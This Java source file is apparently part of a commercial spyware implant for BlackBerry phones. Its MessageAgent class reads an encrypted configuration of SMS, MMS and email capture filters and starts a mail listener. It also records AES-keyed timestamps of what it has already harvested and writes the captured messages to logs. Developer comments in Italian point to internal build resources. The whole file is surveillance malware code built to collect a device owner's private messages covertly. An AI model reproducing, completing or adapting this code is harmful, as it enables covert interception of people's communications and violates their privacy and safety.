package com.ht.rcs.blackberry.agent;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.device.api.io.http.HttpDateParser;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;

import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogType;
import com.ht.rcs.blackberry.log.Markup;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.DateTime;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato


 */

public class MessageAgent extends Agent {

    //#debug
    static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);

    protected static final int SLEEPTIME = 5000;

    MailListener mailListener;
    Markup markup_date;

    public MessageAgent(boolean agentStatus) {
        super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");

        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.MAIL_RAW,
                "Wrong Conversion");
        // #endif

        mailListener = new MailListener(this);
    }

    protected MessageAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        // mantiene la data prima di controllare tutte le email
        markup_date = new Markup(agentId, Keys.getInstance().getAesKey());

        setDelay(SLEEPTIME);
        setPeriod(NEVER);

    }

    long timestamp;
    long firsttimestamp = 0;

    protected String identification;
    public Vector filtersSMS = new Vector();
    public Vector filtersMMS = new Vector();
    public Vector filtersEMAIL = new Vector();

    protected boolean parse(final byte[] conf) {

        Vector tokens = tokenize(conf);
        if (tokens == null) {
            //#debug
            debug.error("Cannot tokenize conf");
            return false;
        }

        int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
            case Prefix.TYPE_IDENTIFICATION:
                // IDENTIFICATION TAG 
                identification = WChar.getString(conf, token.payloadStart,
                        token.length, false);
                //#debug
                debug.trace("Type 1: " + identification);
                break;
            case Prefix.TYPE_FILTER:
                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                try {
                    Filter filter = new Filter(conf, token.payloadStart,
                            token.length);
                    if (filter.isValid()) {
                        switch (filter.classtype) {
                        case Filter.CLASS_EMAIL:
                            //#debug
                            debug.trace("Adding email filter: " + filter.type);
                            filtersEMAIL.addElement(filter);
                            break;
                        case Filter.CLASS_MMS:
                            //#debug
                            debug.trace("Adding mms filter: " + filter.type);
                            filtersMMS.addElement(filter);
                            break;
                        case Filter.CLASS_SMS:
                            //#debug
                            debug.trace("Adding sms filter: " + filter.type);
                            filtersSMS.addElement(filter);
                            break;
                        case Filter.CLASS_UNKNOWN: // fall through
                        default:
                            //#debug
                            debug.error("unknown classtype: "
                                    + filter.classtype);
                            break;
                        }
                    }
                    //#debug
                    debug.trace("Type 2: header valid: " + filter.isValid());
                } catch (Exception e) {
                    //#debug
                    debug.error("Cannot filter" + e);
                }
                break;

            default:
                debug.error("Unknown type: " + token.type);
                break;
            }

            //tokens.removeElementAt(i);
        }

        return true;
    }

    private Vector tokenize(byte[] conf) {
        Vector tokens = new Vector();
        int offset = 0;
        int length = conf.length;

        while (offset < length) {
            Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public void actualStart() {
        mailListener.start();
    }

    public void actualStop() {
        mailListener.stop();
    }

    public void actualRun() {
        mailListener.run();
    }

    long initMarkup() {
        long lastcheck = 0;
        if (markup_date.isMarkup() == false) {
            debug.info("Il Markup non esiste, timestamp = 0 ");
            timestamp = 0;
            Date date = new Date();
            firsttimestamp = date.getTime();

        } else {
            // serializzi la data date
            debug.info("::::::::::::::::::::::::::::::::");
            Date date = new Date();
            timestamp = date.getTime();

            byte[] deserialized;
            debug.trace("Sto leggendo dal markup");
            try {
                deserialized = markup_date.readMarkup();
                lastcheck = Utils.byteArrayToLong(deserialized, 0);

            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

        }
        return lastcheck;
    }

    void updateMarkup() {
        debug.trace("Sto scrivendo nel markup");
        byte[] serialize = Utils.longToByteArray(timestamp);
        markup_date.writeMarkup(serialize);
    }

    void createLog(byte[] additionalData, byte[] content) {
        log.createLog(additionalData);
        log.writeLog(content);
        log.close();
    }
}
